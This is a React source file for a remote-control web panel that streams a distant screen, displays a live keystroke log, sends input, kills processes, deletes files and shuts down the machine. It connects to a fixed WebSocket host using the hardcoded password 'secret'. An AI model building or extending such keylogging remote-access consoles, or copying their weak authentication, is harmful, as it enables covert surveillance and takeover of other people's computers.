import React, { useEffect, useState, useCallback } from "react";

interface SysInfo {
  os: string;
  os_release: string;
  cpu_percent: number;
  memory: {
    total: number;
    used: number;
    available: number;
    percent: number;
  };
  disk: {
    total: number;
    used: number;
    free: number;
    percent: number;
  };
}

const RemoteControl: React.FC = () => {
  const [status, setStatus] = useState("Connecting...");
  const [screenSrc, setScreenSrc] = useState("");
  const [sysInfo, setSysInfo] = useState<SysInfo | null>(null);
  const [procList, setProcList] = useState<any[]>([]);
  const [dirList, setDirList] = useState<any[]>([]);
  const [keyLogs, setKeyLogs] = useState("");
  const [monitorList, setMonitorList] = useState<any[]>([]);
  const [notifications, setNotifications] = useState<string[]>([]);
  const [fileCmd, setFileCmd] = useState("");
  const [ws, setWs] = useState<WebSocket | null>(null);
  const [selectedMonitor, setSelectedMonitor] = useState<number | null>(null);
  const [frameRate, setFrameRate] = useState("10");
  const [isFullScreen, setIsFullScreen] = useState(false);
  const [showFullScreenControls, setShowFullScreenControls] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [processDisplayCount, setProcessDisplayCount] = useState(10);

  const connectWebSocket = useCallback(() => {
    const socket = new WebSocket("wss://ws.demiffy.com:8443/");
    setWs(socket);

    socket.onopen = () => {
      setStatus("Authenticating...");
      setIsConnected(true);
      socket.send("secret");
      socket.send(JSON.stringify({ type: "command", command: "list_monitors" }));
      socket.send(JSON.stringify({ type: "command", command: "get_sysinfo" }));
      socket.send(JSON.stringify({ type: "command", command: "list_processes" }));
      socket.send(JSON.stringify({ type: "command", command: "file_cmd", cmd: "ls" }));
    };

    socket.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);
        switch (msg.type) {
          case "error":
            setStatus(msg.data);
            socket.close();
            break;
          case "info":
            setStatus(msg.data);
            break;
          case "screenshot":
            setScreenSrc("data:image/jpeg;base64," + msg.data);
            break;
          case "keys":
            setKeyLogs((prev) => prev + msg.data);
            break;
          case "sysinfo":
            setSysInfo(msg.data);
            break;
          case "process_list":
            setProcList(msg.data);
            setProcessDisplayCount(10);
            break;
          case "directory_list":
            setDirList(msg.data);
            break;
          case "monitor_list":
            setMonitorList(msg.data);
            break;
          case "notification":
            setNotifications((prev) => [...prev, msg.data]);
            break;
          default:
            console.log("Unhandled message:", msg);
        }
      } catch (e) {
        console.error("Error parsing message:", e);
      }
    };

    socket.onerror = (error) => {
      setStatus("WebSocket error occurred.");
      console.error("WebSocket Error:", error);
    };

    socket.onclose = () => {
      setStatus("Disconnected");
      setIsConnected(false);
    };
  }, []);

  useEffect(() => {
    connectWebSocket();
    return () => {
      ws?.close();
    };
  }, [connectWebSocket]);

  useEffect(() => {
    if (monitorList.length > 0 && selectedMonitor === null) {
      setSelectedMonitor(monitorList.length > 1 ? 1 : 0);
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(
          JSON.stringify({
            type: "command",
            command: "select_monitor",
            index: monitorList.length > 1 ? 1 : 0,
          })
        );
      }
    }
  }, [monitorList, selectedMonitor, ws]);

  const sendCommand = useCallback(
    (commandObj: any) => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        const msg = { type: "command", ...commandObj };
        ws.send(JSON.stringify(msg));
      }
    },
    [ws]
  );

  const sendKeyboard = useCallback(() => {
    const input = document.getElementById("keyInput") as HTMLInputElement;
    const text = input.value;
    if (text.trim() !== "") {
      sendCommand({ command: "keyboard_input", text });
      input.value = "";
    }
  }, [sendCommand]);

  const sendFileCmd = useCallback(() => {
    sendCommand({ command: "file_cmd", cmd: fileCmd });
    setFileCmd("");
  }, [fileCmd, sendCommand]);

  const sendFileCmdAction = (action: string, filename: string) => {
    let cmdStr = "";
    if (action === "cd") {
      cmdStr = "cd " + filename;
    } else if (action === "delete") {
      cmdStr = "delete " + filename;
    } else if (action === "open") {
      cmdStr = "open " + filename;
    }
    sendCommand({ command: "file_cmd", cmd: cmdStr });
  };

  const formatSysInfo = (data: SysInfo) => (
    <div className="space-y-2 transition-all duration-300">
      <div>
        <span className="font-semibold">OS:</span> {data.os} {data.os_release}
      </div>
      <div>
        <span className="font-semibold">CPU:</span> {data.cpu_percent}%
      </div>
      <div>
        <span className="font-semibold">Memory:</span>
        <div className="ml-4 text-sm">
          Total: {(data.memory.total / 1e9).toFixed(2)} GB<br />
          Used: {(data.memory.used / 1e9).toFixed(2)} GB ({data.memory.percent}%)
          <br />
          Free: {(data.memory.available / 1e9).toFixed(2)} GB
        </div>
      </div>
      <div>
        <span className="font-semibold">Disk:</span>
        <div className="ml-4 text-sm">
          Total: {(data.disk.total / 1e9).toFixed(2)} GB<br />
          Used: {(data.disk.used / 1e9).toFixed(2)} GB ({data.disk.percent}%)
          <br />
          Free: {(data.disk.free / 1e9).toFixed(2)} GB
        </div>
      </div>
    </div>
  );

  const formatProcessList = (data: any[]) => (
    <ul className="list-disc ml-5 text-sm transition-all duration-300">
      {data.map((proc) => (
        <li key={proc.pid} className="flex items-center justify-between">
          <span>
            {proc.pid}: {proc.name}
          </span>
          <button
            className="ml-2 px-2 py-1 bg-red-600 rounded hover:bg-red-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "kill_process", pid: proc.pid })}
          >
            Kill
          </button>
        </li>
      ))}
    </ul>
  );

  const formatDirectoryList = (data: any[]) => (
    <ul className="list-none text-sm transition-all duration-300">
      {data.map((item, index) => (
        <li
          key={index}
          className="py-1 px-2 bg-gray-700 rounded flex items-center justify-between my-1 transition-all duration-300"
        >
          <span>
            {item.name} {item.is_dir ? "(DIR)" : ""}
          </span>
          <div className="space-x-2">
            {item.is_dir ? (
              <>
                <button
                  className="px-2 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
                  onClick={() => sendFileCmdAction("cd", item.name)}
                >
                  cd
                </button>
                <button
                  className="px-2 py-1 bg-red-600 rounded hover:bg-red-700 transition-all duration-300"
                  onClick={() => sendFileCmdAction("delete", item.name)}
                >
                  delete
                </button>
              </>
            ) : (
              <>
                <button
                  className="px-2 py-1 bg-green-600 rounded hover:bg-green-700 transition-all duration-300"
                  onClick={() => sendFileCmdAction("open", item.name)}
                >
                  open
                </button>
                <button
                  className="px-2 py-1 bg-red-600 rounded hover:bg-red-700 transition-all duration-300"
                  onClick={() => sendFileCmdAction("delete", item.name)}
                >
                  delete
                </button>
              </>
            )}
          </div>
        </li>
      ))}
    </ul>
  );

  const formatMonitorList = (data: any[]) => (
    <div className="flex flex-wrap justify-center gap-4 transition-all duration-300">
      {data.map((mon) => (
        <div key={mon.index} className="text-center transition-all duration-300">
          <img
            className="w-16 h-16 cursor-pointer border-2 border-gray-600 rounded transition-all duration-300"
            src={
              selectedMonitor === mon.index
                ? "select-monitor.png"
                : "monitor.png"
            }
            alt={`Monitor ${mon.index}`}
            onClick={() => {
              sendCommand({ command: "select_monitor", index: mon.index });
              setSelectedMonitor(mon.index);
            }}
            title={`Monitor ${mon.index} (${mon.width}x${mon.height})`}
          />
          <div className="mt-1 text-sm">Index {mon.index}</div>
        </div>
      ))}
    </div>
  );

  const ControlsPanel = (
    <div className="bg-gray-800 rounded-lg shadow p-4 space-y-4 transition-all duration-300">
      <h2 className="text-xl font-semibold border-b border-gray-600 pb-2">
        Controls
      </h2>
      {/* Mouse Controls */}
      <div>
        <h3 className="text-lg font-medium mb-1">Mouse</h3>
        <div className="flex flex-col items-center space-y-1 transition-all duration-300">
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() =>
              sendCommand({ command: "mouse_move_rel", dx: 0, dy: -50 })
            }
          >
            ↑
          </button>
          <div className="flex space-x-2">
            <button
              className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
              onClick={() =>
                sendCommand({ command: "mouse_move_rel", dx: -50, dy: 0 })
              }
            >
              ←
            </button>
            <button
              className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
              onClick={() =>
                sendCommand({ command: "mouse_move_rel", dx: 50, dy: 0 })
              }
            >
              →
            </button>
          </div>
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() =>
              sendCommand({ command: "mouse_move_rel", dx: 0, dy: 50 })
            }
          >
            ↓
          </button>
          <div className="flex space-x-2 mt-2 transition-all duration-300">
            <button
              className="px-3 py-1 bg-green-600 rounded hover:bg-green-700 transition-all duration-300"
              onClick={() =>
                sendCommand({ command: "mouse_click", button: "left" })
              }
            >
              Left Click
            </button>
            <button
              className="px-3 py-1 bg-green-600 rounded hover:bg-green-700 transition-all duration-300"
              onClick={() =>
                sendCommand({ command: "mouse_click", button: "right" })
              }
            >
              Right Click
            </button>
          </div>
        </div>
      </div>
      {/* Keyboard Controls */}
      <div>
        <h3 className="text-lg font-medium mb-1">Keyboard</h3>
        <div className="flex flex-col space-y-1 transition-all duration-300">
          <input
            id="keyInput"
            type="text"
            placeholder="Type text here"
            className="p-2 rounded bg-gray-700 border border-gray-600 text-white transition-all duration-300"
          />
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={sendKeyboard}
          >
            Send Text
          </button>
        </div>
      </div>
      {/* Scroll Controls */}
      <div>
        <h3 className="text-lg font-medium mb-1">Scroll</h3>
        <div className="flex space-x-2 transition-all duration-300">
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "scroll", amount: 100 })}
          >
            Scroll Up
          </button>
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "scroll", amount: -100 })}
          >
            Scroll Down
          </button>
        </div>
      </div>
      {/* Frame Rate Controls */}
      <div>
        <h3 className="text-lg font-medium mb-1">Frame Rate (fps)</h3>
        <div className="flex items-center space-x-2 transition-all duration-300">
          <input
            type="number"
            value={frameRate}
            onChange={(e) => setFrameRate(e.target.value)}
            className="p-2 rounded bg-gray-700 border border-gray-600 text-white w-20 transition-all duration-300"
          />
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() =>
              sendCommand({ command: "set_framerate", fps: frameRate })
            }
          >
            Set Frame Rate
          </button>
        </div>
      </div>
      {/* File Commands */}
      <div>
        <h3 className="text-lg font-medium mb-1">File Commands</h3>
        <div className="flex flex-col space-y-1 transition-all duration-300">
          <input
            id="fileCmd"
            type="text"
            placeholder="e.g., ls, cd .., delete file.txt"
            value={fileCmd}
            onChange={(e) => setFileCmd(e.target.value)}
            className="p-2 rounded bg-gray-700 border border-gray-600 text-white transition-all duration-300"
          />
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={sendFileCmd}
          >
            Send File Command
          </button>
        </div>
      </div>
      {/* Volume Controls */}
      <div>
        <h3 className="text-lg font-medium mb-1">Volume</h3>
        <div className="flex items-center space-x-2 transition-all duration-300">
          <input
            id="volLevel"
            type="number"
            placeholder="Volume 0-100"
            className="p-2 rounded bg-gray-700 border border-gray-600 text-white w-20 transition-all duration-300"
          />
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() =>
              sendCommand({
                command: "set_volume",
                level: (document.getElementById("volLevel") as HTMLInputElement)
                  .value,
              })
            }
          >
            Set Volume
          </button>
        </div>
      </div>
      {/* Notifications */}
      <div>
        <h3 className="text-lg font-medium mb-1">Notifications</h3>
        <div className="flex flex-col space-y-1 transition-all duration-300">
          <input
            id="notifyMsg"
            type="text"
            placeholder="Notification message"
            className="p-2 rounded bg-gray-700 border border-gray-600 text-white transition-all duration-300"
          />
          <button
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
            onClick={() =>
              sendCommand({
                command: "notify",
                message: (document.getElementById("notifyMsg") as HTMLInputElement)
                  .value,
              })
            }
          >
            Send Notification
          </button>
        </div>
      </div>
      {/* System Commands */}
      <div>
        <h3 className="text-lg font-medium mb-1">System Commands</h3>
        <div className="flex flex-wrap gap-2">
          <button
            className="px-3 py-1 bg-purple-600 rounded hover:bg-purple-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "lock" })}
          >
            Lock
          </button>
          <button
            className="px-3 py-1 bg-purple-600 rounded hover:bg-purple-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "shutdown" })}
          >
            Shutdown
          </button>
          <button
            className="px-3 py-1 bg-purple-600 rounded hover:bg-purple-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "restart" })}
          >
            Restart
          </button>
          <button
            className="px-3 py-1 bg-purple-600 rounded hover:bg-purple-700 transition-all duration-300"
            onClick={() => sendCommand({ command: "sleep" })}
          >
            Sleep
          </button>
        </div>
      </div>
    </div>
  );

  const NormalLayout = (
    <div className="flex flex-col lg:flex-row gap-4 p-10 w-full transition-all duration-300">
      {/* Remote Desktop Section */}
      <div className="bg-gray-800 rounded-lg shadow p-2 lg:w-2/3 sticky top-2 self-start transition-all duration-300">
        <h2 className="text-2xl font-semibold border-b border-gray-600 pb-2 mb-2 text-center transition-all duration-300">
          Remote Desktop
        </h2>
        {screenSrc ? (
          <img
            src={screenSrc}
            alt="Remote Desktop Stream"
            className="w-full border-4 border-gray-700 rounded-md transition-all duration-300"
          />
        ) : (
          <div className="h-64 flex items-center justify-center text-gray-400">
            Awaiting stream...
          </div>
        )}
        {/* Sticky Status Bar */}
        <div className="sticky bottom-0 bg-blue-600 text-center font-semibold py-1 mt-2 rounded transition-all duration-300">
          {status}
        </div>
        {/* Fullscreen Toggle Button */}
        <button
          className="absolute top-2 right-2 bg-gray-800 bg-opacity-50 text-white px-2 py-1 rounded hover:bg-opacity-75 transition-all duration-300"
          onClick={() => setIsFullScreen(true)}
        >
          Fullscreen
        </button>
      </div>
      {/* Controls Panel */}
      <div className="flex-1 p-2 transition-all duration-300">{ControlsPanel}</div>
      {/* Info Panel */}
      <div className="flex-1 bg-gray-800 rounded-lg shadow p-2 space-y-4 transition-all duration-300">
        <h2 className="text-2xl font-semibold border-b border-gray-600 pb-2">Info</h2>
        {/* System Info */}
        <div>
          <div className="flex items-center justify-between">
            <h3 className="text-xl font-medium mb-2">System Info</h3>
            <button
              className="px-2 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
              onClick={() => sendCommand({ command: "get_sysinfo" })}
            >
              Refresh
            </button>
          </div>
          <div>
            {sysInfo ? (
              formatSysInfo(sysInfo)
            ) : (
              <p className="text-sm text-gray-400">No data available</p>
            )}
          </div>
        </div>
        {/* Process List */}
        <div>
          <div className="flex items-center justify-between">
            <h3 className="text-xl font-medium mb-2">Process List</h3>
            <button
              className="px-2 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
              onClick={() => sendCommand({ command: "list_processes" })}
            >
              Refresh
            </button>
          </div>
          <div>
            {procList.length > 0 ? (
              <>
                {formatProcessList(procList.slice(0, processDisplayCount))}
                {processDisplayCount < procList.length && (
                  <button
                    className="mt-2 px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
                    onClick={() =>
                      setProcessDisplayCount(processDisplayCount + 10)
                    }
                  >
                    Load More
                  </button>
                )}
                {processDisplayCount > 10 && (
                  <button
                    className="mt-2 ml-2 px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
                    onClick={() => setProcessDisplayCount(10)}
                  >
                    Collapse
                  </button>
                )}
              </>
            ) : (
              <p className="text-sm text-gray-400">No processes found</p>
            )}
          </div>
        </div>
        {/* Directory Listing */}
        <div>
          <div className="flex items-center justify-between">
            <h3 className="text-xl font-medium mb-2">Directory Listing</h3>
            <button
              className="px-2 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
              onClick={() => sendCommand({ command: "file_cmd", cmd: "ls" })}
            >
              Refresh
            </button>
          </div>
          <div>
            {dirList.length > 0 ? (
              formatDirectoryList(dirList)
            ) : (
              <p className="text-sm text-gray-400">No directory info</p>
            )}
          </div>
        </div>
        {/* Key Logs */}
        <div>
          <h3 className="text-xl font-medium mb-2">Key Logs</h3>
          <div className="max-h-40 overflow-auto bg-gray-700 p-2 rounded text-sm transition-all duration-300">
            {keyLogs || <p className="text-gray-400">No key logs</p>}
          </div>
        </div>
        {/* Monitor List */}
        <div>
          <div className="flex items-center justify-between">
            <h3 className="text-xl font-medium mb-2">Monitor List</h3>
            <button
              className="px-2 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300 text-sm"
              onClick={() => sendCommand({ command: "list_monitors" })}
            >
              Refresh
            </button>
          </div>
          <div>
            {monitorList.length > 0 ? (
              formatMonitorList(monitorList)
            ) : (
              <p className="text-sm text-gray-400">No monitors detected</p>
            )}
          </div>
        </div>
        {/* Notifications List */}
        <div>
          <h3 className="text-xl font-medium mb-2">Notifications</h3>
          <div className="space-y-1 transition-all duration-300">
            {notifications.length > 0 ? (
              notifications.map((n, idx) => (
                <div
                  key={idx}
                  className="bg-gray-700 p-2 rounded text-sm transition-all duration-300"
                >
                  {n}
                </div>
              ))
            ) : (
              <p className="text-sm text-gray-400">No notifications</p>
            )}
          </div>
        </div>
      </div>
    </div>
  );

  const FullScreenLayout = (
    <div className="fixed inset-0 z-50 bg-gray-900 transition-all duration-300">
      <div className="relative h-full w-full transition-all duration-300">
        {screenSrc ? (
          <img
            src={screenSrc}
            alt="Remote Desktop Stream"
            className="w-full h-full object-contain transition-all duration-300"
          />
        ) : (
          <div className="h-full flex items-center justify-center text-gray-400">
            Awaiting stream...
          </div>
        )}
        {/* Exit Fullscreen Button */}
        <button
          className="absolute top-2 right-2 bg-gray-800 bg-opacity-50 text-white px-2 py-1 rounded hover:bg-opacity-75 transition-all duration-300"
          onClick={() => setIsFullScreen(false)}
        >
          Exit Fullscreen
        </button>
        {/* Toggle Controls Overlay Arrow */}
        <button
          className="absolute left-0 top-1/2 transform -translate-y-1/2 p-2 bg-gray-800 bg-opacity-50 text-white rounded-r hover:bg-opacity-75 transition-all duration-300"
          onClick={() => setShowFullScreenControls(!showFullScreenControls)}
        >
          {showFullScreenControls ? "←" : "→"}
        </button>
        {/* Controls Overlay Panel */}
        {showFullScreenControls && (
          <div className="absolute left-0 top-0 h-full w-64 bg-gray-800 bg-opacity-90 p-4 overflow-auto transition-all duration-300">
            <button
              className="mb-4 bg-gray-700 bg-opacity-50 text-white px-2 py-1 rounded hover:bg-opacity-75 transition-all duration-300"
              onClick={() => setShowFullScreenControls(false)}
            >
              Hide Controls
            </button>
            {ControlsPanel}
          </div>
        )}
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-900 text-white relative transition-all duration-300">
      {/* Connection Status Banner */}
      {!isConnected && (
        <div className="p-4 bg-red-600 text-white flex items-center justify-between">
          <span>{status}</span>
          <button
            onClick={connectWebSocket}
            className="px-3 py-1 bg-blue-600 rounded hover:bg-blue-700 transition-all duration-300"
          >
            Rejoin
          </button>
        </div>
      )}
      {isFullScreen ? FullScreenLayout : NormalLayout}
    </div>
  );
};

export default RemoteControl;